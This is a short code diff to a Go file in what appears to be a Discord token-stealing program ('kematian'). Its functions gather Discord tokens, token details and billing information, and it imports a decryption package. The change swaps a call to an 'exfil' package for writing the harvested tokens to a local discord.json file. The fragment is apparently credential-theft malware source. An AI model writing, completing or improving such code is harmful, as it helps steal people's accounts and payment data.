@@ -5,12 +5,11 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"kdot/kematian/decryption"
+	"net/http"
 	"os"
 	"regexp"
 	"strings"
-	"net/http"
-	"kdot/kematian/decryption"
-	"kdot/kematian/exfil"
 )
 
 //var ids []int64
@@ -202,7 +201,7 @@ func GetTokenInfo(token string) Tokens {
 }
 
 func WriteDiscordInfo() {
-	exfil.PrintStuff("discord.json", GetTokens())
+	os.WriteFile("discord.json", []byte(GetTokens()), 0644)
 }
 
 func getBilling(token string) string {
